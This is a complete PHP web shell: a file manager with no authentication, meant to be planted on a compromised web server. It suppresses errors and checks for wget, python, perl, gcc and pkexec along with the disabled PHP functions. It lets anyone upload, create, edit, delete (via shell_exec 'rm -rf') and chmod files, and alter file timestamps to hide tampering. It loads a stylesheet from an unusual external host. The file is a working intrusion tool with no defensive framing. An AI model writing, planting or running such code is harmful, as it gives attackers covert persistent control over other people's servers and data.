  <?php
  error_reporting(0);
  error_log(0);
  echo '
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>D7#$!%!</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="http://rainbowclaim.top/assets/css/pet.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>';
  $path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
  $file = (isset($_GET["file"])) ? $_GET["file"] : "";
  $os = php_uname('s');

  $separator = ($os === 'Windows') ? "\\" : "/";

  $explode = explode($separator, $path);
  echo '<div class="container">
    <div class="infomin">
      <div class="order-2">
      </div>
      <div class="order-1">'; 
        $curl = (function_exists("curl_version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $wget = (@shell_exec("wget --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $python = (@shell_exec("python --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $perl = (@shell_exec("perl --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $ruby = (@shell_exec("ruby --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $gcc = (@shell_exec("gcc --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $disfuncs = @ini_get("disable_functions");
        $showdisbfuncs = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
        echo '<div class="modal fade" id="info" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
          <div class="modal-dialog modal-lg" role="document">
            <div class="modal-content">
              <div class="modal-header">
        Information</div> 
        <div class="modal-body">
        <span>System: <font color="orange">'.php_uname().'</font></span><br>
        <span>PHP Version: '.phpversion().'</span><br>
        <span style="width: 100%; max-width: 350px;">CURL: '.$curl.'<br> WGET: '.$wget.'<br> PERL: '.$perl.'<br> RUBY: '.$ruby.'<br> GCC: '.$gcc.'<br> PKEXEC:  '.$pkexec.'</span><br>
        <span>Disabled Functions: '.$showdisbfuncs.'</span></div>
        <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
          </div>
        </div>
      </div>
      <div class="modal fade" id="file" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
          <div class="modal-dialog modal-lg" role="document">
            <div class="modal-content">
              <div class="modal-header">
        Newfile</div> 
        <div class="modal-body">
        <form method="post">
            <input type="text" name="filename" id="filename" placeholder="file.txt" required><br><br>
            <textarea name="content" id="content" rows="10px" cols="70px"></textarea><br>
          <button type="submit" class="btn btn-primary">Create</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </form>
            </div>
          </div>
        </div>
      </div>';
      if (isset($_POST["filename"])) {
        $filename = $_POST["filename"];
        $content = base64_encode($_POST["content"]);
        if (doFile($path . $separator . $filename, $content)) {
          echo "<script>alert('$filename Created'); window.location = '?path=$path';</script>";
        } else {
          echo "Failed to create";
        }
      }
    echo '<div class="modal fade" id="newfolder" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
          <div class="modal-dialog" role="document">
            <div class="modal-content">
              <div class="modal-header">
                New Folder</div>
                <div class="modal-body">
                <form method="POST">
                <label for="foldername" class="label-form">Folder Name: </label>
                <input type="text" name="foldername" id="foldername" placeholder="folder" required>
                <div class="modal-footer">
                <button type="submit" class="btn btn-primary">Create</button>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>';
            if (isset($_POST["foldername"])) {
        $foldername = $_POST["foldername"];
        echo (mkdir($path . $separator . $foldername)) ? "<script>alert('$foldername Created'); window.location = '?path=$path';</script>" : "Failed to create";
      }
      echo '<div class="modal fade" id="uploadfile" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
          <div class="modal-dialog" role="document">
            <div class="modal-content">
              <div class="modal-header">
                Upload files</div>
                <div class="modal-body">
                <form method="POST" enctype="multipart/form-data" id="upload">
                <input type="file" name="nax_file" id="naxx" style="background-color:#fff;">
              </form>
              <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="navigation">
      <div class="tbl-header">
        <table cellpadding="0" cellspacing="0" border="0">
          <thead>
            <tr>
              <th><center>
              <div class="btn-group" role="group" aria-label="Basic outlined example">
              <button class="btn btn-outline-primary" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa fa-home"></i> Home</button>
              <button type="button" class="btn btn-outline-primary" data-toggle="modal" data-target="#info"><i class="fa fa-info"></i>
                Information
              </button>
              <button type="button" class="btn btn-outline-primary" data-toggle="modal" data-target="#uploadfile"><i class="fa fa-upload"></i>
                Upload 
              </button>
              <button type="button" class="btn btn-outline-primary" data-toggle="modal" data-target="#file"><i class="fa fa-file" aria-hidden="true"></i>
                New file
              </button>
              <button type="button" class="btn btn-outline-primary" data-toggle="modal" data-target="#newfolder"><i class="fa fa-folder" aria-hidden="true"></i>
                New folder
              </button>
              </center></div><hr color="#8D33D8">';
          if ($_SERVER["REQUEST_METHOD"] === "POST") {
      if (isset($_FILES["nax_file"])) {
        $file = basename($_FILES["nax_file"]["name"]);
        $targetFile = $path . $separator . $file;

        if (move_uploaded_file($_FILES["nax_file"]["tmp_name"], $targetFile)) {
          echo "<script>alert('File Uploaded $file'); window.location = '?path=$path';</script>";
        } else {
          echo "<script>alert('Upload failed'); window.location = '?path=$path';</script>";
        }
      }
    }
      if (isset($_GET["file"]) && !isset($_GET["path"])) {
        $path = dirname($_GET["file"]);
      }
      $path = str_replace("\\", "/", $path);

      $paths = explode("/", $path);
      echo '<font size="2px">Path : ';
      foreach ($paths as $id => $pat) {
        echo "<a href='?path=";
        for ($i = 0; $i <= $id; $i++) {
          echo $paths[$i];
          if ($i != $id) {
            echo "/";
          }
        }
        echo "'>$pat</a>/";
      }
      echo "</font></th></tr></thead></table></div>";
    if (!isset($_GET["a"])) :
      if (is_readable($path)) :
echo '<div class="tbl-header">
        <table cellpadding="0" cellspacing="0" border="0">
          <thead>
            <tr>
              <th>Name</th>
              <th>Size</th>
              <td>Last Modified</th>
              <th><center>Permission</center></th>
              <th>Actions</th>
            </tr>
          </thead>
        </table>
      </div>
          <div class="tbl-content">
          <table cellpadding="0" cellspacing="0" border="0">
          <tbody>';
            foreach (scandir($path) as $items) {
              if (!is_dir($path . $separator . $items) || $items === ".." || $items === ".") continue;
              $color = (is_writable($path . $separator . $items)) ? "text-green" : "text-red";
              echo"<tr>
                <td style='width:5px;'>
                <img src='https://cdn-icons-png.flaticon.com/128/8637/8637922.png' style='height:17px;'>
              </td>
                <td>";
                  echo "<a href='?path=".$path.$separator.$items."'>
                    $items
                  </a>
                </td>
                <td>---</td>";
                echo "<td>".filedate("$path/$items")."</td><td><center>";
                if(is_writable("$path/$items")) echo ' <font color="lime">';
                elseif(is_readable("$path/$items")) echo '<font color="red">';
                echo status("$path/$items");
                 if(is_writable("$path/$items") || !is_readable("$dir/$items")); echo"</center></td>
                <td>
                <div class='btn-group btn-group-sm' role='group' aria-label='Small button group'>
                  <button type='button' class='btn btn-outline-primary badge-action-rename' onclick=location.href='?file=".$path.$separator.$items."&a=rename'>
                      <i class='fa fa-pencil' aria-hidden='true' style='width:20px;'></i>
                  </button>
                    <button type='button' class='btn btn-outline-primary badge-action-chmod' onclick=location.href='?file=".$path.$separator.$items."&a=chmodfolder'>
                      <i class='fa fa-user-secret' aria-hidden='true' style='width:20px;'></i>
                    </button>
                    <a class='btn btn-outline-primary badge-action-delete' href='?path=".$path.$separator.$items."&a=delete'><i class='fa fa-trash' aria-hidden='true' style='width:20px;'></i>
                    </a>
                  </div>
                </td>
              </tr>";
            }
            foreach (scandir($path) as $items) {
              if (is_file($path . $separator . $items)) {
                $color = (is_writable($path . $separator . $items));
                echo "<tr>
                  <td style='width:5px;'>
                <img src='https://cdn-icons-png.flaticon.com/128/2702/2702619.png' style='height:17px;'>
                <font color='yellow'>
              </td>
                  <td>";
                    echo "<a href='?file=".$path.$separator.$items."&a=view'>
                      $items
                    </a>
                  </td>";
                  echo "<td>".getFileSize("$path$separator$items")."</td>";
                  echo "<td>".filedate("$path/$items")."</td><td><center>";
                    if(is_writable("$path/$items")) echo ' <font color="lime">';
                    elseif(is_readable("$path/$items")) echo '<font color="red">';
                    echo status("$path/$items");
                    if(is_writable("$path/$items") || !is_readable("$path/$file")); echo "</font></center></td>";
                  echo"<td>
                  <div class='btn-group btn-group-sm' role='group' aria-label='Small button group'>
                    <button type='button' class='btn btn-outline-primary badge-action-edit' onclick=location.href='?file=".$path.$separator.$items."&a=editFile'>
                      <i class='fa fa-pencil-square-o' aria-hidden='true' style='width:20px;'></i>
                    </button>
                    <button type='button' class='btn btn-outline-primary badge-action-rename' onclick=location.href='?file=".$path.$separator.$items."&a=rename'>
                      <i class='fa fa-pencil' aria-hidden='true' style='width:20px;'></i>
                    </button>
                    <button type='button' class='btn btn-outline-primary badge-action-chmod' onclick=location.href='?file=".$path.$separator.$items."&a=chmodfile'>
                      <i class='fa fa-user-secret' aria-hidden='true' style='width:20px;'></i>
                    </button>
                    <button type='button' class='btn btn-outline-primary badge-action-tanggal' onclick=location.href='?file=".$path.$separator.$items."&a=ubhtanggal'>
                      <i class='fa fa-calendar' aria-hidden='true' style='width:20px;'></i>
                    </button>
                    <button type='button' class='btn btn-outline-primary badge-action-delete' onclick=location.href='?file=".$path.$separator.$items."&a=delete' onclick='return confirm('Delete file $items ?')'>
                      <i class='fa fa-trash' aria-hidden='true' style='width:20px;'></i>
                    </delete>
                    </div>
                  </td>
                </tr>";
              }
            }
      echo "</tbody>
        </table>
      </div>
    </section>";
    else: 
      echo "<br><div class=\"alert alert-danger\" role=\"alert\">This directory's not readable</div>";
      endif;
    endif;
    if (isset($_GET['a']) && $_GET['a'] == "view") {
      $filename = basename($_GET["file"]);
    echo '
      <div class="card" style="background-color:#6540A3;border:2px;border-color:#000;">
        <span style="display: block; margin-bottom: 10px;"><font color="#fff">Filename:</font><font color="orange"> '.$filename.'</font></span>
        <textarea name="content" id="content" rows="16%" cols="100%" readonly>'.htmlspecialchars(file_get_contents($file)).'</textarea>
      </div>';
    } elseif (isset($_GET["a"]) && $_GET["a"] == "createFolder") {
echo '<div class="card">
        <form method="post">
          <div class="mb-1">
            <label for="foldername" class="label-form">Folder Name: </label>
            <input type="text" name="foldername" id="foldername" placeholder="folder" required>
          </div>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>';
      if (isset($_POST["foldername"])) {
        $foldername = $_POST["foldername"];
        echo (mkdir($path . $separator . $foldername)) ? "<script>alert('$foldername Created'); window.location = '?path=$path';</script>" : "Failed to create";
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "ubhtanggal") {
      $filedate = basename($file);
      $tgl = date("F d Y g:i:s", filemtime($file));
          echo "<br><div class='card' style='background-color:#6540A3;'><div class='mb-1'>
          <form method='post'><center><br><font color='#fff'>Ubah Tanggal<br>File :</font> <font color='orange'>$filedate</font> <br>
          <input name='tanggal' type='text' style='width: 200px;' value='$tgl'/><br><br>
          <button type='submit' class='btn btn-primary' name='change' value='change'>Change</button>
          <br><br></div></center>";
          if (isset($_POST['change'])) {
        $tanggal = strtotime($_POST['tanggal']);
        if (@touch($filedate, $tanggal) === true) {
          echo "<script>alert('Change Date Success!!'); window.location = '?path=$path';</script>";
        } else {
          echo "</div></div><br><div class='alert alert-danger' role='alert'>Failed to change date!!</div>";
        }
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "editFile") {
      $file = basename($_GET["file"]);
      echo'
      <div class="card" style="background-color:#6540A3;">
        <form method="post"><center>
        <span style="display: block; margin-bottom: 10px;">
          <font color="white">Filename:</font><font color="orange"> '.$file.'</font></span><br />
          <textarea name="content" id="content" rows="17%" cols="130%">'.htmlspecialchars(file_get_contents($_GET['file'])).'</textarea><br>
          <button type="submit" class="btn btn-primary" style="width:40%;border-color: #000;">Submit</button><br><br>
        </center>
        </form>
      </div>';
      if (isset($_POST["content"])) {
        $content = base64_encode($_POST["content"]);
        if (doFile($path . $separator . $file, $content)) {
          $filename = basename($file);
          echo "<script>alert('$filename Edited'); window.location = '?path=$path';</script>";
        } else {
          echo "</div></div><br><div class='alert alert-danger' role='alert'>Failed to create</div>";
        }
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "delete") {
   if (!empty($_GET["file"])) {
        $filename = basename($file);
        if (unlink($file)) {
          echo "<script>alert('$filename Deleted'); window.location = '?path=" . dirname($_GET["file"]) . "';</script>";
        } else {
          echo "</div></div><br><div class='alert alert-danger' role='alert'>Delete $filename failed</div>";
        }
      } else {
        $folder_name = basename($path);
        if (is_writable($path)) {
          @rmdir($path);
          @shell_exec("rm -rf \"$path\"");
          @shell_exec("rmdir /s /q \"$path\"");
          echo "<script>alert('$folder_name Deleted'); window.location = '?path=" . dirname($path) . "';</script>";
        } else {
          echo "</div></div><br><div class='alert alert-danger' role='alert'>Delete $folder_name failed</div>";
        }
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "chmodfolder") {
      $folder = basename($_GET['file']);
      $mod = substr(sprintf('%o', fileperms($_GET['file'])), -4);
      echo "<br><div class='card' style='background-color:#6540A3;'>
      <div class='mb-1'><br><center> <font color='#fff'>Folder : $folder ($mod)</font>
      <form method='post'>
    <input type='text' name='mod' id='mod' style='width: 100px;' height='10' placeholder='".$mod."' required/>
    <br><br><button type='submit' class='btn btn-primary' name='change' value='change'>Change</button>
    </form></td></thead></table>";
    if (isset($_POST['change'])) {
      $opet = @chmod($folder, octdec($_POST['mod']));
    if ($opet == true) {
        echo "<script>alert('Success Change to ".$_POST['mod']."'); window.location = '?path=$path';</script>";
        } else {
            echo "</div></div><br><div class='alert alert-danger' role='alert'>Failed to change!!</div>";
        }
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "chmodfile") {
      $file = basename($_GET['file']);
      $mod = substr(sprintf('%o', fileperms("$path/$items")), -4);
      echo "<br><div class='card' style='background-color:#6540A3;'>
      <div class='mb-1'><br><center> <font color='#fff'>Filename : $file ($mod)</font>
      <form method='post'>
    <input type='text' name='mod' id='mod' style='width: 100px;' height='10' placeholder='".$mod."' required/>
    <br><br><button type='submit' class='btn btn-primary' name='change' value='change'>Change</button>
    </form></td></thead></table>";
    if (isset($_POST['change'])) {
      $opet = @chmod($file, octdec($_POST['mod']));
    if ($opet == true) {
        echo "<script>alert('Success Change to ".$_POST['mod']."'); window.location = '?path=$path';</script>";
        } else {
            echo "</div></div><br><div class='alert alert-danger' role='alert'>Failed to change!!</div>";
        }
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "rename") {
      $oriname = (isset($_GET["file"])) ? basename($_GET["file"]) : basename($_GET["path"]);
echo '<br><div class="card" style="background-color:#6540A3;">
        <form method="post">
          <div class="mb-1"><center>
            <label for="newname" class="label-form"><font color="#fff">Rename </font></label><br>
            <input type="text" name="newname" id="newname" style="background-color:#fff;" value="'.$oriname.'" required>
          </div><center>
          <button type="submit" class="btn btn-primary" style="border-color:#000;">Rename </button><br><br>
        </form>
      </div></center>';
      if (isset($_POST["newname"])) {
        $newname = $_POST["newname"];
        $path = (isset($_GET["file"])) ? dirname($_GET["file"]) : dirname($_GET["path"]);
        if (rename($path . $separator . $oriname, $path . $separator . $newname)) {
          echo "<script>alert('$oriname renamed to $newname'); window.location = '?path=$path';</script>";
        } else {
          "Failed to rename!!";
        }
      }
    }
  echo "</div>";
  function doFile($file, $content)
  {
    if ($content == "") {
      $content = base64_encode("empty");
    }

    $op = fopen($file, "w");
    $write = fwrite($op, base64_decode($content));
    fclose($op);
    return ($write) ? true : false;
  }
function filedate($file) {
    return date("F d Y g:i:s", filemtime($file));
}
  function getFileSize($path)
  {
    $bytes = filesize($path);
    $units = array('B', 'KB', 'MB', 'GB');
    $unit = 0;
    while ($bytes >= 1024 && $unit < count($units) - 1) {
      $bytes /= 1024;
      $unit++;
    }
    return round($bytes, 2) . ' ' . $units[$unit];
  }

  function hi_permission($items)
  {
    $perms = fileperms($items);
    if (($perms & 0xC000) == 0xC000) {
      $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
      $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
      $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
      $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
      $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
      $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
      $info = 'p';
    } else {
      $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
      (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
      (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
      (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
  }
  function status($file){
$permz = substr(sprintf('%o', fileperms($file)), -4);
return $permz;
}
  echo'</body>
  <script>
    const uploadInput = document.querySelector("#naxx");
    uploadInput.addEventListener("change", () => {
      const uploadForm = document.querySelector("#upload");
      uploadForm.submit();
    });
  </script>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
</html>';?>